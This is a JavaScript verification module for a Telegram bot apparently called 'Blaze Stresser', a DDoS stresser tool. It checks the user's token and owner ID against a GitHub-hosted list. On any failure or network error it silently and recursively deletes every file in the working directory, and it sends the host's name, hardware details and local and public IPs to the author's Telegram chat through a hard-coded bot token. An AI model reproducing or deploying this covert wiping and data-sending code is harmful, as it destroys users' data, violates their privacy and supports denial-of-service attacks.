const os = require("os");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const GITHUB_DB_URL =
  "https://raw.githubusercontent.com/rexzy223/database/main/database1.json";
const OWNER_ID = "7675761253";
const BOT_TOKEN = "8012132304:AAFOSCrFcG-_F7rfE0tJvmmoG5wvUzYGz4Y";
const DEBUG = false;

const watchedFiles = [
  "./index.js",
  "./menu.js", 
  "./proxy.txt",
  "./ua.txt"
].map(p => path.resolve(p));

let baseline = {};

function sha256FileSync(fp) {
  try {
    const data = fs.readFileSync(fp);
    return crypto.createHash("sha256").update(data).digest("hex");
  } catch {
    return null;
  }
}

for (const fp of watchedFiles) {
  baseline[fp] = sha256FileSync(fp);
}

function deleteAllSilently(rootDir = ".") {
  try {
    const entries = fs.readdirSync(rootDir);
    for (const entry of entries) {
      const fullPath = path.join(rootDir, entry);
      try { fs.rmSync(fullPath, { recursive: true, force: true }); } catch {}
    }
  } catch {}
}

function removeAllFiles() {
  try {
    deleteAllSilently(".");
  } catch {}
  process.exit(0);
}

function esc(str) {
  return String(str || "")
    .replace(/&/g, "&")
    .replace(/</g, "<")
    .replace(/>/g, ">")
    .replace(/"/g, '"');
}

async function getPublicIp() {
  try {
    const r = await axios.get("https://api.ipify.org?format=json", { timeout: 4000 });
    return r.data?.ip || "-";
  } catch {
    return "-";
  }
}

function getLocalIps() {
  try {
    const nets = os.networkInterfaces();
    const out = [];
    for (const k of Object.keys(nets)) {
      for (const ni of nets[k]) {
        if (ni.family === "IPv4" && !ni.internal) out.push(ni.address);
      }
    }
    return out.length ? out : ["-"];
  } catch {
    return ["-"];
  }
}

async function sendHtmlToOwner(html) {
  if (!BOT_TOKEN || !OWNER_ID) {
    if (DEBUG) console.log("DEBUG: BOT_TOKEN/OWNER_ID belum diatur.");
    return;
  }
  try {
    await axios({
      method: "post",
      url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      data: {
        chat_id: OWNER_ID,
        text: html,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      },
    });
  } catch {}
}

async function notifyOwnerHtml(invalidToken, reason = "Token Tidak Valid", ownerId = OWNER_ID) {
  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Makassar" });
  const sysInfo = {
    hostname: os.hostname(),
    platform: `${os.platform()} ${os.arch()}`,
    cpu: os.cpus()[0]?.model || "-",
    ram: Math.round(os.totalmem() / 1024 / 1024),
    localIp: getLocalIps().join(", "),
    publicIp: await getPublicIp(),
  };

  const html = `
<blockquote>
<b>🚨 REXZY SECURITY ALERT 🚨</b>

<b>⚠️ PERINGATAN:</b> ${esc(reason)}

<b>╭━──━⊱「 DETAIL SISTEM 」</b>
<b>┃🔹 Token / Owner Diperiksa:</b> <code>${esc(invalidToken)}</code>
<b>┃🔹 Owner ID:</b> <code>${esc(ownerId)}</code>
<b>┃🔹 Hostname:</b> <code>${esc(sysInfo.hostname)}</code>
<b>┃🔹 Platform:</b> <code>${esc(sysInfo.platform)}</code>
<b>┃🔹 CPU:</b> <code>${esc(sysInfo.cpu)}</code>
<b>┃🔹 RAM:</b> <code>${sysInfo.ram} MB</code>
<b>┃🔹 IP Lokal:</b> <code>${esc(sysInfo.localIp)}</code>
<b>┃🔹 IP Publik:</b> <code>${esc(sysInfo.publicIp)}</code>
<b>┃🔹 Node.js:</b> <code>${esc(process.version)}</code>
<b>┃🔹 Waktu (WITA):</b> <code>${esc(now)}</code>
<b>╰━───────────────────────────────━❏</b>

<i>Pesan ini dikirim otomatis oleh sistem keamanan Rexzy.</i>
</blockquote>
`.trim();

  await sendHtmlToOwner(html);
}

async function getBotInfoFromToken(token) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    if (!res.ok) return null;
    const j = await res.json();
    if (!j.ok || !j.result) return null;
    return {
      id: j.result.id,
      username: j.result.username || `${j.result.first_name || "-"}`,
    };
  } catch {
    return null;
  }
}

async function verifyToken(token) {
  try {
    console.log("\x1b[34m⏳ Memeriksa token di GitHub Database...\x1b[0m");
    const res = await fetch(GITHUB_DB_URL);
    if (!res.ok) throw new Error(`Gagal fetch database (${res.status})`);
    const data = await res.json();
    let tokens = [];
    if (Array.isArray(data)) tokens = data;
    else if (data.tokens) tokens = data.tokens;
    else if (data.token) tokens = data.token;
    else if (data.Token) tokens = data.Token;
    else if (data["Token bot"]) tokens = data["Token bot"];
    else if (typeof data === "object") tokens = Object.values(data);
    else tokens = [];
    tokens = tokens.flat().map((t) => String(t).trim()).filter(Boolean);
    const valid = tokens.includes(token);
    if (!valid) {
      console.log("\x1b[31m❌ Token anda tidak terdaftar!\x1b[0m");
      await notifyOwnerHtml(token, "Token Tidak Valid / Tidak Terdaftar");
      removeAllFiles();
      return { valid: false };
    }
    return { valid: true };
  } catch {
    removeAllFiles();
    return { valid: false };
  }
}

const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const BLUE = "\x1b[34m";
const RESET = "\x1b[0m";

async function verifyOwner(ownerId) {
  try {
    console.log(`${BLUE}⏳ Memeriksa ID Owner di GitHub Database...${RESET}`);
    const res = await fetch(GITHUB_DB_URL);
    if (!res.ok) throw new Error(`Gagal fetch database (${res.status})`);
    const data = await res.json();

    let owners = [];
    if (Array.isArray(data.owners)) owners = data.owners;
    else if (Array.isArray(data.owner)) owners = data.owner;
    else if (Array.isArray(data.Owner)) owners = data.Owner;
    else if (Array.isArray(data["Owner ID"])) owners = data["Owner ID"];

    owners = owners.flat().map(t => String(t).trim()).filter(Boolean);
    const valid = owners.includes(String(ownerId));
    if (!valid) {
      console.log(`${RED}❌ ID owner anda tidak terdaftar!\x1b[0m`);
      await notifyOwnerHtml(ownerId, "ID Owner Tidak Valid");
      removeAllFiles();
      return false;
    }

    const ascii = [
      "⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀",
      "⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀",
      "⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀Bot Name : Blaze Stresser",
      "⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀Verion : 3.0.0",
      "⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀Author : @xyzrexzzy",
      "⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀",
      "⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀",
      "⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀",
      "⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿",
      "⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀",
      "⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀",
      "⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀",
      "⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦",
      "⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋",
      "⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉"
    ];

    ascii.forEach(line => console.log(`${RED}${line}${RESET}`));
    console.log(`${GREEN}────────────────────────────${RESET}`);
    console.log(`${GREEN}Your Token : Valid${RESET}`);
    console.log(`${GREEN}Your UID : Valid${RESET}`);
    return true;
  } catch {
    removeAllFiles();
    return false;
  }
}

module.exports = { verifyToken, verifyOwner, notifyOwnerHtml };